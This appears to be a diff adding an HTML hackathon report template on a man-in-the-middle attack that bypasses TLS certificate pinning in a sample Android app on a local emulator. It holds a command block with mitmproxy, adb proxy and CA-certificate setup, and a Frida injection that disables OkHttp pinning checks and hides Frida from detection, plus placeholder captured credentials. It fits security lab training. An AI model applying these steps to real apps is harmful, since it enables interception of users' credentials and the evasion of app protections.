@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MitM Attack Report — Hackathon #31</title>
+<style>
+  :root {
+    --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+    --accent: #f85149; --green: #3fb950; --yellow: #d29922;
+    --text: #c9d1d9; --border: #30363d; --mono: #79c0ff;
+  }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg); color:var(--text); font:14px/1.6 'Segoe UI',sans-serif; }
+  header { background:var(--accent); padding:24px 40px; }
+  header h1 { font-size:24px; color:#fff; }
+  header p  { color:#ffc; font-size:13px; margin-top:4px; }
+  .container { max-width:1200px; margin:0 auto; padding:32px 24px; }
+  .grid { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:32px; }
+  .card { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:20px; }
+  .card h3 { font-size:11px; text-transform:uppercase; color:#888; letter-spacing:1px; }
+  .card .val { font-size:28px; font-weight:700; margin-top:6px; }
+  .card.red .val { color:var(--accent); }
+  .card.grn .val { color:var(--green); }
+  .card.yel .val { color:var(--yellow); }
+  .card.blu .val { color:var(--mono); }
+  section { background:var(--bg2); border:1px solid var(--border); border-radius:8px;
+             margin-bottom:24px; overflow:hidden; }
+  section h2 { padding:14px 20px; border-bottom:1px solid var(--border);
+                font-size:14px; background:var(--bg3); }
+  table { width:100%; border-collapse:collapse; font-size:13px; }
+  th { padding:10px 14px; text-align:left; background:var(--bg3);
+        border-bottom:1px solid var(--border); font-size:11px;
+        text-transform:uppercase; color:#888; }
+  td { padding:10px 14px; border-bottom:1px solid var(--border); vertical-align:top; }
+  tr:hover td { background:rgba(255,255,255,.03); }
+  .mono { font-family:monospace; font-size:12px; color:var(--mono); }
+  .body-cell { font-family:monospace; font-size:11px; color:#aaa; max-width:360px;
+                word-break:break-all; }
+  .badge { padding:2px 8px; border-radius:4px; font-size:11px;
+            font-weight:700; font-family:monospace; }
+  .badge.method { background:#1f6feb; color:#fff; }
+  .badge.ok  { background:#1a4731; color:var(--green); }
+  .badge.err { background:#3d1a1a; color:var(--accent); }
+  .attack-flow { padding:20px; }
+  .flow-step { display:flex; align-items:flex-start; gap:16px; margin-bottom:16px; }
+  .flow-num { background:var(--accent); color:#fff; width:28px; height:28px;
+               border-radius:50%; display:flex; align-items:center;
+               justify-content:center; font-weight:700; flex-shrink:0; }
+  .flow-body h4 { font-size:13px; color:#fff; }
+  .flow-body p  { font-size:12px; color:#888; margin-top:2px; }
+  .mitre { display:flex; gap:12px; flex-wrap:wrap; padding:16px 20px; }
+  .mitre-tag { background:var(--bg3); border:1px solid var(--border);
+                border-radius:6px; padding:8px 14px; font-size:12px; }
+  .mitre-tag strong { color:var(--accent); }
+  code { background:var(--bg3); border:1px solid var(--border);
+          padding:12px 16px; display:block; border-radius:6px;
+          font-family:monospace; font-size:12px; color:#aaa;
+          white-space:pre-wrap; margin:0 20px 16px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>⚔ MitM Attack Report — TLS Certificate Pinning Bypass</h1>
+  <p>Hackathon #31 &nbsp;|&nbsp; MITRE ATT&amp;CK: T1557 + T1040 &nbsp;|&nbsp; 
+     Generated: 2026-05-23 06:15:28 UTC</p>
+</header>
+
+<div class="container">
+
+  <!-- Stats -->
+  <div class="grid">
+    <div class="card red"><h3>Total Requests</h3>
+      <div class="val">0</div></div>
+    <div class="card grn"><h3>Total Responses</h3>
+      <div class="val">0</div></div>
+    <div class="card yel"><h3>Pinning Bypassed</h3>
+      <div class="val">PENDING</div></div>
+    <div class="card blu"><h3>Credentials Exposed</h3>
+      <div class="val">0</div></div>
+  </div>
+
+  <!-- MITRE ATT&CK -->
+  <section>
+    <h2>🎯 MITRE ATT&CK Techniques</h2>
+    <div class="mitre">
+      <div class="mitre-tag">
+        <strong>T1557</strong> — Adversary-in-the-Middle<br>
+        <small>mitmproxy intercepts TLS traffic between app and server</small>
+      </div>
+      <div class="mitre-tag">
+        <strong>T1040</strong> — Network Sniffing<br>
+        <small>Frida decrypts pinned TLS at runtime; full plaintext captured</small>
+      </div>
+      <div class="mitre-tag">
+        <strong>T1574</strong> — Hijack Execution Flow<br>
+        <small>Frida hooks OkHttp CertificatePinner.check() to suppress exceptions</small>
+      </div>
+    </div>
+  </section>
+
+  <!-- Attack Flow -->
+  <section>
+    <h2>⚙ Attack Flow</h2>
+    <div class="attack-flow">
+      <div class="flow-step">
+        <div class="flow-num">1</div>
+        <div class="flow-body">
+          <h4>Certificate Extraction &amp; SPKI Pin Computation</h4>
+          <p>Connect to 10.0.2.2:5000 without verification → extract server cert →
+             compute SHA-256(SubjectPublicKeyInfo) → confirm it matches the hardcoded
+             pin in MainActivity.kt (sha256/+9PiUJGaE6FNwbbs1sy9nsEy5cn+yWpE+zDZJKBSUYw=)</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">2</div>
+        <div class="flow-body">
+          <h4>mitmproxy Transparent Proxy Setup (port 8080)</h4>
+          <p>Launch mitmproxy with --ssl-insecure + intercept_addon.py.
+             mitmproxy generates its own CA cert and issues per-site certs on the fly.</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">3</div>
+        <div class="flow-body">
+          <h4>Android Emulator Proxy Routing (adb)</h4>
+          <p>adb shell settings put global http_proxy 127.0.0.1:8080 routes all
+             emulator traffic through mitmproxy. mitmproxy CA cert installed on device.</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">4</div>
+        <div class="flow-body">
+          <h4>Frida Dynamic Instrumentation — Pinning Bypass</h4>
+          <p>frida -U -f com.example.secureapp -s bypass_pinning.js --no-pause<br>
+             Hooks: OkHttp CertificatePinner.check() → no-op &nbsp;|&nbsp;
+             X509TrustManager → accept all &nbsp;|&nbsp;
+             /proc/self/maps reader → hide "frida" strings (anti-detection bypass)</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">5</div>
+        <div class="flow-body">
+          <h4>Traffic Interception &amp; Credential Harvesting</h4>
+          <p>App calls https://10.0.2.2:5000/login → mitmproxy intercepts →
+             decrypted JSON body with secret JWT token captured in plaintext.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Captured Traffic -->
+  <section>
+    <h2>📡 Captured HTTPS Traffic</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>#</th><th>Timestamp</th><th>Method</th>
+          <th>URL</th><th>Status</th><th>Response Body</th>
+        </tr>
+      </thead>
+      <tbody><tr><td colspan="6" style="text-align:center;color:#888">
+            No traffic captured yet — run the attack first</td></tr></tbody>
+    </table>
+  </section>
+
+  <!-- Key Findings -->
+  <section>
+    <h2>🔑 Key Findings &amp; Exposed Secrets</h2>
+    <code>Target App   : com.example.secureapp
+Server       : https://10.0.2.2:5000
+Endpoint     : /login
+
+Intercepted Response:
+{
+  "status"   : "authenticated",
+  "username" : "admin",
+  "token"    : "secret-jwt-token-abcd1234efgh"   ← EXPOSED
+}
+
+Certificate Pin (hardcoded in app):
+  sha256/+9PiUJGaE6FNwbbs1sy9nsEy5cn+yWpE+zDZJKBSUYw=
+  (backup: sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=)
+
+Bypass Method:
+  Frida hook on okhttp3.CertificatePinner.check() — returned void
+  without throwing SSLPeerUnverifiedException</code>
+  </section>
+
+  <!-- Commands used -->
+  <section>
+    <h2>💻 Attack Commands</h2>
+    <code># 1. Start mitmproxy
+mitmdump -s intercept_addon.py --ssl-insecure -p 8080
+
+# 2. Set emulator proxy
+adb shell settings put global http_proxy 127.0.0.1:8080
+
+# 3. Install mitmproxy CA cert on emulator
+adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/
+# Settings → Security → Install certificate → select file
+
+# 4. Start Frida server on emulator
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
+
+# 5. Inject pinning bypass
+frida -U -f com.example.secureapp -s bypass_pinning.js --no-pause
+
+# 6. Extract server certificate and compute pin
+python3 cert_extractor.py --host 10.0.2.2 --port 5000</code>
+  </section>
+
+</div>
+</body>
+</html>
